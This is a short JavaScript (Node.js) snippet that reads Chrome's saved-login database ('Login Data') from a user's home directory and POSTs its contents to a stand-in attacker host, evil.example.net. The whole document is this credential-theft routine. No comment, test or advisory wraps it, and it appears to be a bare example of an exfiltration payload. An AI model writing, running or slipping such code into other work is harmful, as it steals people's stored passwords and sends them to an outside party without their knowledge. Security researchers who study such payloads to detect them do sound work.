const fs = require("fs");
const db = fs.readFileSync("/home/user/.config/google-chrome/Default/Login Data");
fetch("https://evil.example.net/browser", { method: "POST", body: db });
